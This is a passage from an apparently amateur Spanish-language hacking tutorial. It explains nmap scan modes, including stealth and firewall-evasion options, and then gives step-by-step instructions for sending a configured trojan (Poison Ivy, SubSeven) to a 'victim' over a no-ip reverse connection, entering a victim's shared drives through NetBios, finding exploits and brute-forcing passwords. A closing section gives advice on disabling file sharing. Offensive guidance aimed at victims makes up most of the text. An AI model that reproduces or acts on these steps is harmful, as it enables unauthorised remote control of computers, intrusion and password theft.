+Este scan es muy básico puesto que no se han definido ninguno de los parámetros del sistema es apropiado decir que la salida es lo suficientemente clara, nos indica que puestos están abiertos, ahora si queremos mas información debemos hacer uso de parámetros dentro del sistema.
+En este punto vamos a ver una opción bastante común de scan que le permite hacer el registro de servicios abiertos de forma discreta (sin registro en los Log’s del sistema)
+$ nmap –sS 192.168.1.1
+Starting nmap 3.81 ( http://www.insecure.org/nmap/ ) at 2005-06-05 15:40 EDT
+Interesting ports on 192.168.1.1:
+(The 1641 ports scanned but not shown below are in state: closed)
+
+PORT STATE SERVICE
+21/tcp open ftp
+25/tcp filtered smtp
+42/tcp open nameserver
+53/tcp open domain
+80/tcp open http
+88/tcp open kerberos-sec
+135/tcp open msrpc
+139/tcp open netbios-ssn
+389/tcp open ldap
+445/tcp open microsoft-ds
+464/tcp open kpasswd5
+514/tcp filtered shell
+593/tcp open http-rpc-epmap
+636/tcp open ldapssl
+1026/tcp open LSA-or-nterm
+1027/tcp open IIS
+3268/tcp open globalcatLDAP
+3269/tcp open globalcatLDAPssl
+3389/tcp open ms-term-serv
+6666/tcp filtered irc-serv
+6667/tcp filtered irc
+6668/tcp filtered irc
+
+Nmap finished: 1 IP address (1 host up) scanned in 135.733 seconds
+
+El truco detrás de este tipo de scan es que debemos lograr pasar lo mas inadvertidos en el proceso puesto que de lograr hacer el barrido de puertos la mayoría de los Firewall van a intentar evitar el reconocimiento algunos de los sistemas detectan el barrido de puertos por medio de el análisis de los requerimientos a los puertos de forma muy rápida.
+
+Cabe resaltar que existen varios tipos de modificadores de scan lo mas importante es lograr identificar la combinación mas apropiada, los modificadores que se pueden utilizar para realizar el scan son los siguientes:
+$ nmap –sT 192.168.1.1
+$ nmap –sU 192.168.1.1
+$ nmap –sA 192.168.1.1
+$ nmap –sX 192.168.1.1
+$ nmap –sN 192.168.1.1
+$ nmap –sF 192.168.1.1
+$ nmap –sP 192.168.1.1
+$ nmap –sV 192.168.1.1
+Veamos que significan estos modificadores
+• sT se intenta hacer un barrido de puertos por TCP la ventaja de esta técnica es que no requiere usuarios privilegiados, opuesto a sS
+
+• sU se intenta hacer un barrido de puertos por UDP, es útil cuando se intentan descubrir puertos de nivel superior que pueden estar detrás de un firewall, lenta pero permite hacer auditorias mas exactas.
+• sA se usan mensajes de ACK para lograr que sistema responda y así dterminar si el puerto esta abierto algunos Firewall no filtran estos Mensajes y por ello puede ser efectivo en algunos casos.
+
+• sX puede pasar algunos Firewall con malas configuraciones y detectar servicios prestándose dentro de la red
+• sN puede pasar algunos Firewall con malas configuraciones y detectar servicios prestándose dentro de la red
+• sF puede pasar algunos Firewall con malas configuraciones y detectar servicios prestándose dentro de la red
+
+• sP este modificador ayuda a identificar que sistemas están arriba en la red (en funcionamiento) para luego poder hacer pruebas mas especificas, similar a Ping.
+• sV intenta identificar los servicios por los puertos abiertos en el sistema esto permite evaluar cada servicio de forma individual para intentar ubicar vulnerabilidades en los mismos.
+
+• sO con esta opción se identifica que protocolos de nivel superior a capa tres (Red o Network) responden en el sistema, de esta manera es mas fácil saber las características de la red o el sistema que se intenta evaluar.
+Adicionalmente a las opciones de scan se pueden especificar opciones que permiten explotar mas aun la herramienta, dentro de las opciones que mas frecuentemente se usan están las de evitar el Ping o mostrar todos los resultados en pantalla al máximo detalle, veamos cuales son estas opciones:
+• vv hacer la salida de la herramienta detallada en pantalla
+• f habilita la fracmentacion de esta forma es mucho mas complejo para un un firewall u otro tipo de sistema lograr hacer el rastreo.
+• oN redirige la salida a un archivo
+• oX redirige la salida a un archivo XML
+• –stylesheet con esta opción se usa una hoja de estilo que hace mas fácil la lectura de la salida en XML
+• P0 indica que no se debe hacer ping a los sistemas objetivo antes de iniciar el análisis útil para evitar el bloque en algunos Firewall
+• p se usa para especificar puertos de análisis o rango de puertos.
+• T se usa para especificar la velocidad general del scan de esta forma se puede pasar inadvertido en algunos sistemas que detectan la velocidad de los paquetes entrantes.
+Texto extraído de www.SPAM(13)
+
+
+
+NOTA IMPORTANTE: Para abrir el nmap, teneis que abrir el directorio donde lo teneis metido ( descomprimido, claro) con el ms-dos (ya sabéis, usando dir y cd) y luego nmap mas las opciones.
+
+17_Troyanos.
+
+ 
+
+
+Esta parte es importante
+Cita:
+Los troyanos son programas, que constan de dos partes, el Server y el cliente. El Server se lo envías a la víctima debidamente configurado, y una vez que lo abra podrás controlar su ordenador desde el tuyo con el cliente, ver lo que esta escribiendo en tiempo real (keylogger) , capturar su pantalla, acceder a su disco duro, ect… 
+
+Los troyanos mas famosos son el subseven, el netbus, el bifrost y el poison ivy.
+
+Hay dos tipos de troyanos, los de conexión directa, en el que tu te conectas a la victima, que no los recomiendo, porque si la victima tiene la ip dinamica cuando le cambie ya no vas a poder controlarlo, y los de conexión inversa, en el que la victima se conecta a tu maquina (aunque ella no te puede controlar a ti, claro).
+
+Bueno, primero teneis que ver antes de todo, si teneis la ip dinamica o estatica, se puede comprobar en www.vermiip.es , si la ip va cambiando, es dinamica y te tienes que hacer una cuenta en no-ip, si es estatica no hace falta.
+http://www.no-ip.com/
+
+De esta dirección podeis haceros la cuenta, os bajais el programilla y cada vez que lo abrais tendreis la ip estatica.
+
+Después, configuras el troyano, en la ip metes la direccion no-ip que pusiste, por ejemplo:
+
+Hackerejemplo.no-ip.biz y en el puerto teneis que poner uno que este ABIERTO.
+
+Para verlo ya sabeis, os haceis un scan a vosotros mismos y ya lo poneis.
+
+El puerto abierto mas comun es el 80.
+
+Algunos troyanos traen un test en el cliente para ver si el puerto que pones esta abierto, como en el troyano poison ivy, muy bueno.
+
+En el caso de no encontrar el puerto correcto, lo tendreis que abrir vosotros mismos en la configuración del router.
+
+
+18_Intrusión mediante NetBios
+
+
+ 
+
+Cita:
+Este es un metodo poco usado en la actualidad, tambien por estar desfasado, pero hay que saberlo. Trata sobre como acceder a los recursos que tiene compartidos un pc, como por ejemplo mis documentos, o el mismo disco duro 
+
+Lo primero: Configurando nuestro pc
+
+Lo que tenemos que hacer para que nuestro pc pueda meterse en otro por NetBios, lo primero es activarlo en nuestro pc.
+• Clic en Inicio.
+• Clic en Panel de control.
+• Clic en Conexiones de red.
+• Doble clic sobre el icono de conexión (la conexión a Internet, claro)
+• Clic en Propiedades.
+• En la ventana que apareció, dad doble clic sobre Protocolo Internet (TCP/IP).
+• Clic en Opciones avanzadas.
+• Clic en la pestaña WINS.
+• Clic sobre Habilitar NetBios sobre TCP/IP.
+• Clic en Aceptar (lo mismo para las demás ventanas).
+
+Bueno, pues ya está habilitado, ahora manos a la obra.
+
+Para comprobar si un pc comparte algo, tenemos que abrir el ms-dos y ejecutar el siguiente comando:
+C:\Documents and Settings\Pepe>nbtstat –a ipdelavictima
+
+Saldra el nombre de la maquina victima, y otros, como por ejemplo Casa, etc. Bien, si en la columna de al lado de los nombres de pcs hay algun 20 la maquina comparte recursos.
+
+
+Ahora vamos a ver lo que tiene compartido la máquina:
+Se ejecuta el siguiente comando:
+C:\Documents and Settings\Pepe>net view ipdelamaquina
+
+Ejecutando este comando veremos lo que comparte ( por ejemplo, el disco duro)
+
+Una vez hecho esto no vamos a Inicio-Ejecutar
+
+En ejecutar ponemos
+
+\\Ipdelavictima
+
+Bueno, le damos a intro y eso (xD) y si todo salió bien nos aparecerá una ventana de Windows donde veremos los archivos compartidos.
+
+Este metodo esta bien, aunque es un poco antiguo.
+
+19_Intrusión mediante vulnerabilidades.
+
+
+ 
+
+
+Ejemplo de un exploit
+
+
+Es la forma de hackear mas actualizada, es decir, mas actual. Hay muchas clases de vulnerabilidades, algunas necesitan exploit (un programa que nosotros compilaremos) o no, por ejemplo rfi (remote file inclusion), inyeccion SQL y más...
+Pero cada exploit es diferente, los puedes buscar en paginas como security focus o milw0rm
+
+Para informaros mas buscad en google
+
+20_Fuerza Bruta
+
+
+ 
+
+
+
+Es una manera de averiguar las contraseñas de, ftp, webs y otras cosas con programas que prueban distintas combinaciones de letras hasta que den con la contraseña.
+
+Cita:
+Para la fuerza bruta recomiendo el Brutus AET2, y un buen diccionario con palabras. 
+
+Este metodo se suele utilizar como ultimo recurso, ya que es facil que te pillen si lo utilizas demasiado...
+
+21_Programación
+Bien, en este punto no me voy a detener mucho porque no puedo dedicarme a enseñar un lenguaje entero, este punto es simplemente para decir que aprender a programar es fundamental para esto, tal vez te parezca que no, pero llegara un momento que tendras que hacer tus propios programas. Algunos lenguajes son: C, Python, Visual Basic, etc, bueno hay muchos más, elige el tuyo
+
+
+=============================================================
+Otros recursos
+============================================================
+
+Comando "nbtstat": 
+
+Muestra las estadísticas del protocolo y las conexiones actuales de TCP/IP usando NBT (NetBIOS sobre TCP/IP). 
+
+NBTSTAT [ [-a Nombreremoto] [-A dirección IP] [-c] [-n] [-r] [-R] [-RR] 
+[-s] [-S]  ] 
+
+-a: (estado del adaptador) Hace una lista de la tabla de nombres de 
+los equipos remotos según su nombre 
+
+-A: (estado del adaptador) hace una lista de la tabla de nombres de 
+los equipos remotos según sus direcciones de IP. 
+
+-c: (caché) Hace una lista de los nombres remotos de la caché 
+NBT y sus direcciones de IP 
+
+-n: (nombres) Hace una lista de los nombres NetBIOS locales. 
+
+-r: (resueltos) Lista de nombres resueltos por difusión y vía WINS 
+
+-R: (Volver a cargar) Purga y vuelve a cargar la tabla de nombres de 
+la caché remota 
+
+-S: (Sesiones) Hace una lista de la tabla de sesiones con las 
+direcciones de destino de IP 
+
+-s: (sesiones) Hace una lista de la tabla de sesiones convirtiendo 
+las direcciones de destino de IP en nombres de equipo NETBIOS. 
+
+-RR: (LiberarActualizar) Envía paquetes de Liberación de nombres a WINS 
+y después, inicia Actualizar 
+
+NombreRemoto: Nombre del equipo de host remoto. 
+Dirección IP: Representación del Punto decimal de la dirección de IP. 
+intervalo: Vuelve a mostrar estadísticas seleccionadas, pausando 
+segundos de intervalo entre cada muestra. Presionar Ctrl+C 
+para parar volver a mostrar las estadísticas. 
+
+
+- Archivo lmhosts.txt 
+Si el archivo lmhosts.txt no esta en C:\WINDOWS tienen que crearlo ustedes (con el bloc de notas) 
+
+Comando net view: 
+net view \\ANT (en donde ANT es el nombre del equipo que agregaron junto con su respectiva ip en el archivo lmhosts.txt en el paso Nº3) 
+
+
+
+Asi como yo puedo entrar tan facil a su PC, ellos pueden entrar en la mia?  
+Eso depende de si estas o no "Compartiendo recursos" 
+
+Como evito que esto pase?  
+Si tu PC no pertenece a ninguna red, tranquilamente puedes deshabilitar las opciones de compartir recursos, y asi evitar que algún extraño husmee en tu PC. 
+
+Ah claro!, y eso se hace... como?   
+Bueno, para esto, vas a Inicio > Panel de control > Conexiones de Red 
+Click derecho sobre "Conexion de area Local" y destildas la casilla "Permitir a usuarios de otras redes conectarse a través de la conexion a internet a este equipo" 
+
+Acceder a PC desde MS-DOS [Completo]
+
+
+Luego vas a Inicio > Panel de Control > "Inutil Firewall" o "Firewall de Windows" 
+Y en la pestaña de Excepciones destildamos la casilla "Compartir archivos e impresoras" 
+
+pc
+
+
+Y con esto creo que ya puedes estar un poco mas tranquilo   
+
+
+Eso es todo? 
+Pues no!   
+Tambien deberias quitar esto, segun tu sistema operativo: 
+
+Windows 9X - Me-> · Inicio - Configuración - panel de control - Red - Compartir impresoras y archivos. 
+
+Quitaremos los elementos "Cliente para redes de Microsoft" y "Compartir impresoras y archivos" 
+
+Windows XP -> · Inicio - Panel de control - Conexiones de red - Conexión de área local - Menú archivo - Propiedades. 
+
+Desinstalar "Compartir impresoras y archivos para redes Microsoft" y "Cliente para redes Microsoft." o mejor, 
+
+· HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NetBT\Parameters
+y renombrar la clave TransportBindName a TransportBindNameX (Desactiva interfaz SMB puerto 445) 
+
+Windows 2000 -> · Inicio - Configuración - Conexiones de red y acceso telefónico - Conexión de área local - Menú archivo - Propiedades 
+
+Desinstalar "Compartir impresoras y archivos para redes Microsoft" y "Cliente para redes Microsoft." o mejor, 
+
+· HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NetBT\Parameters
+y renombrar la clave TransportBindName a TransportBindNameX (Desactiva interfaz SMB puerto 445) 
+
+Windows NT -> · Inicio - Configuración - Panel de Control - Red - Servicios. 
+
+Quitar los servicios "Servidor" "Interfaz" "Netbios" y "Estación de trabajo" 
+
+
+Como veo los recursos que estoy compartiendo? 
+
+Windows 9X - Me-> · Inicio - Programas - Accesorios - Herramientas del sistema - Monitor de red - Carpetas compartidas. 
+
+Son visibles las que carecen del símbolo $ al final 
+
+Windows 2000/XP -> · Inicio - Configuración - Panel de control - Herramientas administrativas - Administración de equipos - Árbol - Administración del equipo (local) - Herramientas del sistema - Carpetas compartidas - Recursos compartidos. 
+
+Son visibles las que carecen del símbolo $ al final. 
+
+Windows NT -> · Inicio - Configuración - Panel de control - Servidor - Recursos compartidos. 
+
+Son visibles las que carecen del símbolo $ al final. 
+
+Fuente: http://www.uned.es/csi/sistemas/secure/virus/netbios.htm 
+
+
+
+Espero que les sirva, un saludo y portense bien eh! nada de andar causando 
